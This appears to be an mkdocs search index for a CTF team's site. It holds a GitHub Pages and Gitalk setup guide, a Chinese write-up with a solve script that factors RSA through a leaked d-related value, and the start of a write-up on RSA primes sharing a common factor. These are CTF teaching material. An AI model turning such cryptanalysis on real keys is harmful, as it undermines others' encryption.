{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"f61d Welcome to f61d team. challenges For more details: https://github.com/f61d/challenges web https://f61d.github.io/web/ pwn https://f61d.github.io/pwn/ crypto https://f61d.github.io/crypto/ reverse https://f61d.github.io/reverse/ misc https://f61d.github.io/misc/","title":"home"},{"location":"#f61d","text":"Welcome to f61d team.","title":"f61d"},{"location":"#challenges","text":"For more details: https://github.com/f61d/challenges","title":"challenges"},{"location":"#web","text":"https://f61d.github.io/web/","title":"web"},{"location":"#pwn","text":"https://f61d.github.io/pwn/","title":"pwn"},{"location":"#crypto","text":"https://f61d.github.io/crypto/","title":"crypto"},{"location":"#reverse","text":"https://f61d.github.io/reverse/","title":"reverse"},{"location":"#misc","text":"https://f61d.github.io/misc/","title":"misc"},{"location":"backup/gitpage_fuck/","text":"github pages\u91c7\u5751 dev master User Pages gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002 \u64cd\u4f5c\u8bb0\u5f55 mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"gitpage\u91c7\u5751"},{"location":"backup/gitpage_fuck/#github-pages","text":"","title":"github pages\u91c7\u5751"},{"location":"backup/gitpage_fuck/#devmaster-user-pages","text":"gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002","title":"dev&amp;master User Pages"},{"location":"backup/gitpage_fuck/#_1","text":"mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"\u64cd\u4f5c\u8bb0\u5f55"},{"location":"crypto/","text":"waiting","title":"home"},{"location":"crypto/#waiting","text":"","title":"waiting"},{"location":"crypto/RSA/Fermat's little theorem/","text":"HEBCTF-easy_RSA \u9898\u76ee\u4ee3\u7801 from gmpy2 import * from Crypto.Util import number #e = have a try~ p = number . getPrime ( 1024 ) q = number . getPrime ( 1024 ) nothing = 251560377963038761190200797029988859033 # getPrime(128) n = p * q fn = ( p - 1 ) * ( q - 1 ) d = inverse ( e , fn ) something = ( p - 1 ) d + nothing enc = pow ( flag , e , p * q ) print ( n ) #n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943 print ( s ) #something=286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625 print ( enc ) #enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810 \u4ee3\u7801\u5206\u6790 1\u3001\u4ee3\u7801\u4e2d\u6ca1\u6709\u7ed9\u51fae\u7684\u503c\uff0c\u731c\u6d4b\u662f\u5e38\u89c1\u7684e\u503c\uff0c\u5c1d\u8bd5\u4e86 65535 \u3001 65537 \u3002 2\u3001\u4ee3\u7801\u4e2d\u7ed9\u51fa\u4e86d\u548cp\u7684\u5173\u7cfb\uff0c\u56e0\u6b64\u53ef\u5229\u7528 \u8d39\u9a6c\u5c0f\u5b9a\u7406 \u6c42\u89e3\u3002 \u3010\u8d39\u9a6c\u5c0f\u5b9a\u7406\u3011\u5982\u679cp\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u800c\u6574\u6570a\u4e0d\u662fp\u7684\u500d\u6570\uff0c\u5219\u6709 a^(p-1)\u22611 mod p \u3002 \u89e3\u9898\u8fc7\u7a0b 1\u3001\u6211\u4eec\u53ef\u4ee5\u8bbe A = m^(p-1)-1 \uff0c\u5176\u4e2d m^(p-1) \u2261 1 mod p \uff0c\u6545A\u662fp\u7684\u500d\u6570\uff0c\u7531\u4e8e N = p*q \uff0c\u56e0\u6b64 gcd(A,N)=p \u3002 2\u3001\u7531m^e \u2261 c mod N\u5f97\u5230 c = m^e - b*N\uff08b\u662f\u6574\u6570\uff09\u3002 3\u3001\u53c8\u56e0\u4e3a c^d \u2261 m mod N \uff0c\u6240\u4ee5 (m^e - b*N)^d = m mod N \uff0c\u8fdb\u4e00\u6b65 (m^e)^d = m mod N \u3002 4\u3001\u7b49\u5f0f\u4e24\u8fb9\u53d6 p-1 \u6b21\u65b9\uff0c\u5f97\u5230\uff1a (m^ed)^(p-1) mod N = m^(p-1) mod N \uff0c\u5373\uff1a m^e(s-n) mod N = m^(p-1) mod N \u3002 5\u3001\u5f97\u5230 A = (m^e(s-n) mod N)-1 \uff0c\u5373\u53ef\u6c42\u5f97 p = gcd(A,N) \u3002 \u4ee3\u7801\u5982\u4e0b import gmpy2 from Crypto.Util.number import * n = 14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943 enc = 4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810 something = 286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625 nothing = 251560377963038761190200797029988859033 e = 65537 A = pow ( 2 , e * something - e * nothing , n ) - 1 p = gmpy2 . gcd ( A , n ) q = n // p d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) m = pow ( enc , d , n ) flag = long_to_bytes ( m ) print ( flag )","title":"Fermat's little theorem"},{"location":"crypto/RSA/Fermat's little theorem/#hebctf-easy_rsa","text":"","title":"HEBCTF-easy_RSA"},{"location":"crypto/RSA/Fermat's little theorem/#_1","text":"from gmpy2 import * from Crypto.Util import number #e = have a try~ p = number . getPrime ( 1024 ) q = number . getPrime ( 1024 ) nothing = 251560377963038761190200797029988859033 # getPrime(128) n = p * q fn = ( p - 1 ) * ( q - 1 ) d = inverse ( e , fn ) something = ( p - 1 ) d + nothing enc = pow ( flag , e , p * q ) print ( n ) #n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943 print ( s ) #something=286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625 print ( enc ) #enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810","title":"\u9898\u76ee\u4ee3\u7801"},{"location":"crypto/RSA/Fermat's little theorem/#_2","text":"1\u3001\u4ee3\u7801\u4e2d\u6ca1\u6709\u7ed9\u51fae\u7684\u503c\uff0c\u731c\u6d4b\u662f\u5e38\u89c1\u7684e\u503c\uff0c\u5c1d\u8bd5\u4e86 65535 \u3001 65537 \u3002 2\u3001\u4ee3\u7801\u4e2d\u7ed9\u51fa\u4e86d\u548cp\u7684\u5173\u7cfb\uff0c\u56e0\u6b64\u53ef\u5229\u7528 \u8d39\u9a6c\u5c0f\u5b9a\u7406 \u6c42\u89e3\u3002 \u3010\u8d39\u9a6c\u5c0f\u5b9a\u7406\u3011\u5982\u679cp\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u800c\u6574\u6570a\u4e0d\u662fp\u7684\u500d\u6570\uff0c\u5219\u6709 a^(p-1)\u22611 mod p \u3002","title":"\u4ee3\u7801\u5206\u6790"},{"location":"crypto/RSA/Fermat's little theorem/#_3","text":"1\u3001\u6211\u4eec\u53ef\u4ee5\u8bbe A = m^(p-1)-1 \uff0c\u5176\u4e2d m^(p-1) \u2261 1 mod p \uff0c\u6545A\u662fp\u7684\u500d\u6570\uff0c\u7531\u4e8e N = p*q \uff0c\u56e0\u6b64 gcd(A,N)=p \u3002 2\u3001\u7531m^e \u2261 c mod N\u5f97\u5230 c = m^e - b*N\uff08b\u662f\u6574\u6570\uff09\u3002 3\u3001\u53c8\u56e0\u4e3a c^d \u2261 m mod N \uff0c\u6240\u4ee5 (m^e - b*N)^d = m mod N \uff0c\u8fdb\u4e00\u6b65 (m^e)^d = m mod N \u3002 4\u3001\u7b49\u5f0f\u4e24\u8fb9\u53d6 p-1 \u6b21\u65b9\uff0c\u5f97\u5230\uff1a (m^ed)^(p-1) mod N = m^(p-1) mod N \uff0c\u5373\uff1a m^e(s-n) mod N = m^(p-1) mod N \u3002 5\u3001\u5f97\u5230 A = (m^e(s-n) mod N)-1 \uff0c\u5373\u53ef\u6c42\u5f97 p = gcd(A,N) \u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"crypto/RSA/Fermat's little theorem/#_4","text":"import gmpy2 from Crypto.Util.number import * n = 14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943 enc = 4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810 something = 286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625 nothing = 251560377963038761190200797029988859033 e = 65537 A = pow ( 2 , e * something - e * nothing , n ) - 1 p = gmpy2 . gcd ( A , n ) q = n // p d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) m = pow ( enc , d , n ) flag = long_to_bytes ( m ) print ( flag )","title":"\u4ee3\u7801\u5982\u4e0b"},{"location":"crypto/RSA/huwangbei2019_Crypto1/","text":"huwangbei2019_Crypto Just decrypt it. Examination Site RSA multiplicative group modulo N Analysis The key code: def gen (): while True : g = getPrime ( 500 ) a = b = 0 while not gmpy2 . is_prime ( 2 * g * a + 1 ): a = random . randint ( 2 ** 523 , 2 ** 524 ) while not gmpy2 . is_prime ( 2 * g * b + 1 ): b = random . randint ( 2 ** 523 , 2 ** 524 ) h = 2 * g * a * b + a + b if gmpy2 . is_prime ( h ): p = 2 * g * a + 1 q = 2 * g * b + 1 return p * q , g We will found that p,q have 1025 bit and have a common factor g which has 500 bit. Howevers,the a,b is unknown and we have to solve them. Reference: Further Attacks On Server-Aided Rsa Cryptosystems According to the article, we can fristly calculate the a*b and (a+b). As we have known N and g,we can calculate the u and v: h = ( N - 1 ) / ( g ) u = h / ( g ) # 4 * xy v = h % ( g ) # 2 * (x+y) And now we have x + y = v + c*g and xy = u -c where c is the unknown carry in (N-1)/g in base g. Since The range of possible values for c is given cg 4*(x+y) and x,y N^( )/g,so that there are of the order of C = sqrt(N)/(g*g) values of c to test. The article gives us a 